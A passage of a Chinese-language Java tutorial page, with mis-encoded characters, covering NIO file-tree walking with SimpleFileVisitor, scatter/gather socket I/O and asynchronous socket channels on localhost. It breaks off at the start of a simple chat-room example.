class="line">è®¿é—®æ–‡ä»¶: docs/çº¦å®š.md</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/æœ¬åœ°å¼€å‘ç¯å¢ƒé…ç½®æ•™ç¨‹.md</span><br><span class="line">è®¿é—®æ–‡ä»¶: docs/å‰ç«¯å·¥ç¨‹ç»“æ„è¯´æ˜.md</span><br><span class="line">æ­£åœ¨è®¿é—®ç›®å½•: docs</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªåä¸º MyFileVisitor çš„è‡ªå®šä¹‰ FileVisitor ç±»ï¼Œå®ƒæ‰©å±•äº† SimpleFileVisitor ç±»ã€‚SimpleFileVisitor æ˜¯ FileVisitor æ¥å£çš„ä¸€ä¸ªå®ç°ï¼Œå®ƒæä¾›äº†ä¸€äº›é»˜è®¤çš„è¡Œä¸ºã€‚æˆ‘ä»¬å¯ä»¥è¦†ç›– SimpleFileVisitor ä¸­çš„æ–¹æ³•ä»¥å®ç°è‡ªå·±çš„é€»è¾‘ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬åªæ˜¯æ‰“å°å‡ºäº†è®¿é—®çš„æ–‡ä»¶å’Œç›®å½•ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ Files.walkFileTree æ–¹æ³•éå†æ–‡ä»¶æ ‘ã€‚è¿™ä¸ªæ–¹æ³•ä¼šéå†æ•´ä¸ªç›®å½•ç»“æ„ï¼Œå¹¶è°ƒç”¨ MyFileVisitor ä¸­çš„ç›¸åº”æ–¹æ³•ã€‚</p><p>å…¶ä¸­ï¼ŒFileVisitResult æšä¸¾åŒ…å«ä»¥ä¸‹å››ä¸ªé€‰é¡¹ï¼š</p><ul><li>CONTINUE ï¼š ç»§ç»­</li><li>TERMINATE ï¼š ç»ˆæ­¢</li><li>SKIP_SIBLINGS ï¼š è·³è¿‡å…„å¼ŸèŠ‚ç‚¹ï¼Œç„¶åç»§ç»­</li><li>SKIP_SUBTREE ï¼š è·³è¿‡å­æ ‘ï¼ˆä¸è®¿é—®æ­¤ç›®å½•çš„æ¡ç›®ï¼‰ï¼Œç„¶åç»§ç»­ï¼Œä»…åœ¨ preVisitDirectory æ–¹æ³•è¿”å›æ—¶æ‰æœ‰æ„ä¹‰ï¼Œé™¤æ­¤ä»¥å¤–å’Œ CONTINUE ç›¸åŒã€‚</li></ul><h4 id="æœç´¢æ–‡ä»¶"><a href="#æœç´¢æ–‡ä»¶" class="headerlink" title="æœç´¢æ–‡ä»¶"></a>æœç´¢æ–‡ä»¶</h4><p><code>walkFileTree()</code> æ–¹æ³•è¿˜å¯ä»¥ç”¨äºæœç´¢æ–‡ä»¶ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­æ‰©å±•äº† SimpleFileVisitor æ¥æŸ¥æ‰¾ä¸€ä¸ªåä¸º itwanger.txt çš„æ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FindFileWithWalkFileTree</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">startingDir</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">targetFileName</span> <span class="operator">=</span> <span class="string">&quot;itwanger.txt&quot;</span>;</span><br><span class="line">        <span class="type">FindFileVisitor</span> <span class="variable">findFileVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FindFileVisitor</span>(targetFileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.walkFileTree(startingDir, findFileVisitor);</span><br><span class="line">            <span class="keyword">if</span> (findFileVisitor.isFileFound()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;æ‰¾åˆ°æ–‡ä»¶äº†: &quot;</span> + findFileVisitor.getFoundFilePath());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;oohï¼Œæ–‡ä»¶æ²¡æ‰¾åˆ°&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">FindFileVisitor</span> <span class="keyword">extends</span> <span class="title class_">SimpleFileVisitor</span>&lt;Path&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> String targetFileName;</span><br><span class="line">        <span class="keyword">private</span> Path foundFilePath;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">FindFileVisitor</span><span class="params">(String targetFileName)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.targetFileName = targetFileName;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFileFound</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> foundFilePath != <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Path <span class="title function_">getFoundFilePath</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> foundFilePath;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> FileVisitResult <span class="title function_">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getFileName().toString();</span><br><span class="line">            <span class="keyword">if</span> (fileName.equals(targetFileName)) &#123;</span><br><span class="line">                foundFilePath = file;</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.TERMINATE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸»æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ Files.walkFileTree æ–¹æ³•éå†æ–‡ä»¶æ ‘ï¼Œå¹¶ä¼ é€’ä¸€ä¸ªèµ·å§‹ç›®å½•å’Œ FindFileVisitor å®ä¾‹ã€‚éå†å®Œæˆåï¼Œæˆ‘ä»¬æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°äº†ç›®æ ‡æ–‡ä»¶ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œå°±æ‰“å°å‡ºå®ƒçš„è·¯å¾„ã€‚##</p><h2 id="NIOå®ç°ç½‘ç»œèŠå¤©å®¤"><a href="#NIOå®ç°ç½‘ç»œèŠå¤©å®¤" class="headerlink" title="NIOå®ç°ç½‘ç»œèŠå¤©å®¤"></a>NIOå®ç°ç½‘ç»œèŠå¤©å®¤</h2><h3 id="Scatter-å’Œ-Gather"><a href="#Scatter-å’Œ-Gather" class="headerlink" title="Scatter å’Œ Gather"></a>Scatter å’Œ Gather</h3><p>Scatter å’Œ Gather æ˜¯ Java NIO ä¸­ä¸¤ç§é«˜æ•ˆçš„ I&#x2F;O æ“ä½œï¼Œç”¨äºå°†æ•°æ®åˆ†æ•£åˆ°å¤šä¸ªç¼“å†²åŒºæˆ–ä»å¤šä¸ªç¼“å†²åŒºä¸­æ”¶é›†æ•°æ®ã€‚</p><p>Scatterï¼ˆåˆ†æ•£ï¼‰ï¼šå®ƒå°†ä» Channel è¯»å–çš„æ•°æ®åˆ†æ•£ï¼ˆå†™å…¥ï¼‰åˆ°å¤šä¸ªç¼“å†²åŒºã€‚è¿™ç§æ“ä½œå¯ä»¥åœ¨è¯»å–æ•°æ®æ—¶å°†å…¶åˆ†æ•£åˆ°ä¸åŒçš„ç¼“å†²åŒºï¼Œæœ‰åŠ©äºå¤„ç†ç»“æ„åŒ–æ•°æ®ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ¶ˆæ¯å¤´ã€æ¶ˆæ¯ä½“å’Œæ¶ˆæ¯å°¾åˆ†åˆ«å†™å…¥ä¸åŒçš„ç¼“å†²åŒºã€‚<br>Gatherï¼ˆèšé›†ï¼‰ï¼šä¸ Scatter ç›¸åï¼Œå®ƒå°†å¤šä¸ªç¼“å†²åŒºä¸­çš„æ•°æ®èšé›†ï¼ˆè¯»å–ï¼‰å¹¶å†™å…¥åˆ°ä¸€ä¸ª Channelã€‚è¿™ç§æ“ä½œå…è®¸æˆ‘ä»¬åœ¨å‘é€æ•°æ®æ—¶ä»å¤šä¸ªç¼“å†²åŒºä¸­èšé›†æ•°æ®ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ¶ˆæ¯å¤´ã€æ¶ˆæ¯ä½“å’Œæ¶ˆæ¯å°¾ä»ä¸åŒçš„ç¼“å†²åŒºä¸­èšé›†åˆ°ä¸€èµ·å¹¶å†™å…¥åˆ°åŒä¸€ä¸ª Channelã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æœåŠ¡ç«¯</span></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªServerSocketChannel</span></span><br><span class="line"><span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">serverSocketChannel.socket().bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">9000</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥å—è¿æ¥</span></span><br><span class="line"><span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> serverSocketChannel.accept();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Scatterï¼šåˆ†æ•£è¯»å–æ•°æ®åˆ°å¤šä¸ªç¼“å†²åŒº</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">ByteBuffer[] buffers = &#123;headerBuffer, bodyBuffer&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(buffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡ºç¼“å†²åŒºæ•°æ®</span></span><br><span class="line">headerBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (headerBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) headerBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">System.out.println();</span><br><span class="line"></span><br><span class="line">bodyBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (bodyBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) bodyBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Gatherï¼šèšé›†æ•°æ®ä»å¤šä¸ªç¼“å†²åŒºå†™å…¥åˆ°Channel</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerResponse</span> <span class="operator">=</span> ByteBuffer.wrap(<span class="string">&quot;Header Response&quot;</span>.getBytes());</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyResponse</span> <span class="operator">=</span> ByteBuffer.wrap(<span class="string">&quot;Body Response&quot;</span>.getBytes());</span><br><span class="line"></span><br><span class="line">ByteBuffer[] responseBuffers = &#123;headerResponse, bodyResponse&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">bytesWritten</span> <span class="operator">=</span> socketChannel.write(responseBuffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…³é—­è¿æ¥</span></span><br><span class="line">socketChannel.close();</span><br><span class="line">serverSocketChannel.close();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªSocketChannel</span></span><br><span class="line"><span class="type">SocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> SocketChannel.open();</span><br><span class="line">socketChannel.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">9000</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é€æ•°æ®åˆ°æœåŠ¡å™¨</span></span><br><span class="line"><span class="type">String</span> <span class="variable">header</span> <span class="operator">=</span> <span class="string">&quot;Header Content&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;Body Content&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerBuffer</span> <span class="operator">=</span> ByteBuffer.wrap(header.getBytes());</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyBuffer</span> <span class="operator">=</span> ByteBuffer.wrap(body.getBytes());</span><br><span class="line"></span><br><span class="line">ByteBuffer[] buffers = &#123;headerBuffer, bodyBuffer&#125;;</span><br><span class="line">socketChannel.write(buffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»æœåŠ¡å™¨æ¥æ”¶æ•°æ®</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">headerResponseBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">128</span>);</span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">bodyResponseBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">ByteBuffer[] responseBuffers = &#123;headerResponseBuffer, bodyResponseBuffer&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="variable">bytesRead</span> <span class="operator">=</span> socketChannel.read(responseBuffers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¾“å‡ºæ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line">headerResponseBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (headerResponseBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) headerResponseBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bodyResponseBuffer.flip();</span><br><span class="line"><span class="keyword">while</span> (bodyResponseBuffer.hasRemaining()) &#123;</span><br><span class="line">    System.out.print((<span class="type">char</span>) bodyResponseBuffer.get());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…³é—­è¿æ¥</span></span><br><span class="line">socketChannel.close();</span><br></pre></td></tr></table></figure><h3 id="å¼‚æ­¥å¥—æ¥å­—é€šé“-AsynchronousSocketChannel-å’Œ-AsynchronousServerSocketChannel"><a href="#å¼‚æ­¥å¥—æ¥å­—é€šé“-AsynchronousSocketChannel-å’Œ-AsynchronousServerSocketChannel" class="headerlink" title="å¼‚æ­¥å¥—æ¥å­—é€šé“ AsynchronousSocketChannel å’Œ AsynchronousServerSocketChannel"></a>å¼‚æ­¥å¥—æ¥å­—é€šé“ AsynchronousSocketChannel å’Œ AsynchronousServerSocketChannel</h3><p>AsynchronousSocketChannel å’Œ AsynchronousServerSocketChannel æ˜¯ Java 7 å¼•å…¥çš„å¼‚æ­¥ I&#x2F;O ç±»ï¼Œåˆ†åˆ«ç”¨äºå¤„ç†å¼‚æ­¥å®¢æˆ·ç«¯ Socket å’ŒæœåŠ¡å™¨ç«¯ ServerSocketã€‚å¼‚æ­¥ I&#x2F;O å…è®¸åœ¨ I&#x2F;O æ“ä½œè¿›è¡Œæ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œå¹¶åœ¨æ“ä½œå®Œæˆæ—¶æ¥æ”¶é€šçŸ¥ï¼Œæé«˜äº†å¹¶å‘å¤„ç†èƒ½åŠ›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsynchronousServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> AsynchronousServerSocketChannel.open();</span><br><span class="line">        server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">5000</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;æœåŠ¡å™¨å¯åŠ¨&quot;</span>);</span><br><span class="line"></span><br><span class="line">        server.accept(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, Void&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel client, Void attachment)</span>&#123;</span><br><span class="line">                <span class="comment">// æ¥æ”¶ä¸‹ä¸€ä¸ªè¿æ¥è¯·æ±‚</span></span><br><span class="line">                server.accept(<span class="literal">null</span>, <span class="built_in">this</span>);</span><br><span class="line">                <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line">                Future&lt;Integer&gt; readResult = client.read(buffer);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    readResult.get();</span><br><span class="line">                    buffer.flip();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(buffer.array(), <span class="number">0</span>, buffer.remaining());</span><br><span class="line">                    System.out.println(<span class="string">&quot;æ¥æ”¶åˆ°çš„æ¶ˆæ¯&quot;</span> + message);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Void attachment)</span> &#123;</span><br><span class="line">                exc.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">                <span class="comment">// ä¸ºäº†è®©æœåŠ¡å™¨ç»§ç»­è¿è¡Œï¼Œæˆ‘ä»¬éœ€è¦ç»„ç»‡mainå¿åŸé€€å‡º</span></span><br><span class="line">        Thread.currentThread().join();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Java ä¸­ï¼Œ<code>Future</code> æ˜¯ä¸€ç§ç”¨äºè¡¨ç¤ºå¼‚æ­¥è®¡ç®—ç»“æœçš„æ¥å£ã€‚å®ƒæä¾›äº†ä¸€ç§åœ¨å¼‚æ­¥ä»»åŠ¡å®Œæˆåè·å–ç»“æœçš„æœºåˆ¶ã€‚ä¸Šé¢çš„ä»£ç ä¸­ä½¿ç”¨äº† <code>Future&lt;Integer&gt;</code>ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¡¨ç¤º <code>client.read(buffer)</code> æ–¹æ³•çš„å¼‚æ­¥è¯»å–æ“ä½œçš„ç»“æœã€‚</p><p><code>Future</code> çš„ä½œç”¨</p><ul><li><strong>å¼‚æ­¥æ“ä½œ</strong>ï¼šåœ¨ <code>client.read(buffer)</code> ä¸­ï¼Œ<code>read</code> æ–¹æ³•æ˜¯å¼‚æ­¥çš„ï¼Œè¿™æ„å‘³ç€å®ƒä¸ä¼šç«‹å³è¿”å›è¯»å–çš„å­—èŠ‚æ•°ï¼Œè€Œæ˜¯ç«‹å³è¿”å›ä¸€ä¸ª <code>Future</code> å¯¹è±¡æ¥è¡¨ç¤ºè¯»å–æ“ä½œçš„çŠ¶æ€ã€‚</li><li><strong>è·å–ç»“æœ</strong>ï¼šé€šè¿‡è°ƒç”¨ <code>Future</code> å¯¹è±¡çš„ <code>get()</code> æ–¹æ³•ï¼Œå¯ä»¥ç­‰å¾…æ“ä½œå®Œæˆå¹¶è·å¾—æœ€ç»ˆçš„è¯»å–ç»“æœã€‚æ­¤æ—¶ï¼Œå¦‚æœè¯»å–æ“ä½œè¿˜æ²¡æœ‰å®Œæˆï¼Œ<code>get()</code> ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°è¯»å–æ“ä½œå®Œæˆåè¿”å›ç»“æœã€‚</li><li><strong>æ§åˆ¶ä»»åŠ¡å®ŒæˆçŠ¶æ€</strong>ï¼š<code>Future</code> è¿˜æä¾›äº† <code>isDone()</code> ç­‰æ–¹æ³•ï¼Œå¯ä»¥åœ¨ä¸é˜»å¡çš„æƒ…å†µä¸‹æ£€æŸ¥ä»»åŠ¡æ˜¯å¦å®Œæˆï¼Œä»è€Œè®©ç¨‹åºæ›´çµæ´»åœ°å¤„ç†å¼‚æ­¥æ“ä½œã€‚</li></ul><p>ç¤ºä¾‹æµç¨‹è¯´æ˜</p><ol><li>å½“å®¢æˆ·ç«¯è¿æ¥æ—¶ï¼ŒæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ª <code>ByteBuffer</code> æ¥æ¥æ”¶æ•°æ®ã€‚</li><li><code>client.read(buffer)</code> å‘èµ·å¼‚æ­¥è¯»å–ï¼Œå¹¶ç«‹å³è¿”å›ä¸€ä¸ª <code>Future&lt;Integer&gt;</code>ã€‚</li><li>é€šè¿‡ <code>readResult.get()</code> é˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´åˆ°è¯»å–å®Œæˆã€‚</li><li>ä¸€æ—¦è¯»å–å®Œæˆï¼Œä»£ç å°† <code>buffer</code> çš„å†…å®¹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶è¾“å‡ºåˆ°æ§åˆ¶å°ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsynchronousClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">AsynchronousSocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> AsynchronousSocketChannel.open();</span><br><span class="line">            Future&lt;Void&gt; connectResult = client.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">5000</span>));</span><br><span class="line">            connectResult.get();</span><br><span class="line">            </span><br><span class="line">            <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;å“ˆé‡Œç‹¬å®¶é˜¿&quot;</span>;</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.wrap(message.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            Future&lt;Integer&gt; writeResuilt = client.write(buffer);</span><br><span class="line">            writeResuilt.get();</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ¶ˆæ¯å‘é€å®Œæ¯•&quot;</span>);</span><br><span class="line">            client.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç®€å•èŠå¤©å®¤ä»£ç "><a href="#ç®€å•èŠå¤©å®¤ä»£ç " class="headerlink" title="ç®€å•èŠå¤©å®¤ä»£ç "></a>ç®€å•èŠå¤©å®¤ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 